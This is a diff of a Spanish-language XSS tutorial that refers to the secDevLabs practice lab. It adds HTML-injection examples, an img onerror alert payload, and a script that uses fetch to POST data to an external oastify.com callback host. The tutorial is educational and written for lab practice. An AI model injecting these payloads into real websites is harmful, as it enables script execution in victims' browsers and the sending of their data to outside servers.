@@ -17,17 +17,37 @@ Los ataques XSS pueden tener graves consecuencias para las empresas y los usuari
 A continuación, se proporciona el proyecto de GitHub correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:
 
 -   **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
+* [Ejercicios-XSS](https://sudo.co.il/xss/)
+## HTML
 
+```javascript
+<h1>Hola</h1>                                                /// Podemos hacer inyecciones con codigo HTML
+<marquee>Hola</marquee>                                      /// Podemos usar marquee para que el texto nos salga animado, de izquierda a derecha 
+
+<a href="https://www.ionos.mx/digitalguide/URL">Texto ancla</a>
+
+<img src="images/imagen.png">
+<img src="https://test.com/images/imagen.png">
+
+<img src="X" onerror=alert(1) />
+
+<iframe src="http://ejemplo.org/demo.html" height="400" width="800" name="demo">
+  <p>Su navegador no es compatible con iframes</p>
+</iframe>
+```
 
 ## JavaScript en la web
 
 Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en donde podemos colocar las inyecciones.
 
 ```javascript
-<h1>Hola</h1>                                                /// Podemos hacer inyecciones con codigo HTML
-<marquee>Hola</marquee>                                      /// Podemos usar marquee para que el texto nos salga animado, de izquierda a derecha 
-
 <script>alert("XSS")</script>                                /// Creamos una ventana emergente con codigo javascript que dice XSS
+
+<script>
+  fetch('https://kwklry4t8e18m8q8k5uikgydy44vslga.oastify.com',{method:'POST', mode:'no-cors', body:'omar'});
+</script>
+
+
 ```
 
 ----
